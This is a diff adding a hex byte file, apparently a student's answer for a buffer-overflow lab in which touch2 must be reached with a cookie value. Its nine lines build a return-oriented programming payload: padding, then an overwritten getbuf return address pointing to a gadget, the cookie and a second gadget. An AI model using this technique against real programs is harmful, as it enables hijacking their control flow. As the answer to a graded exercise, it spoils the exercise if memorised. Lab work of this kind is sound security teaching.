@@ -1,0 +1,9 @@
+00 00 00 00 00 00 00 00	/* -0x28 */
+00 00 00 00 00 00 00 00	/* -0x20 */
+00 00 00 00 00 00 00 00	/* -0x18 */
+00 00 00 00 00 00 00 00	/* -0x10 */
+00 00 00 00 00 00 00 00	/* -0x8  */
+ab 19 40 00 00 00 00 00	/* -0x0  here is ret of "getbuf" and weshould modify it to first gadget' */
+fa 97 b9 59 00 00 00 00	/* +0x8  here is to pop the address of cookie */
+c5 19 40 00 00 00 00 00 /* +0x10 here is to second gadget */	
+ec 17 40 00 00 00 00 00 /* +0x18 here is to touch2 */
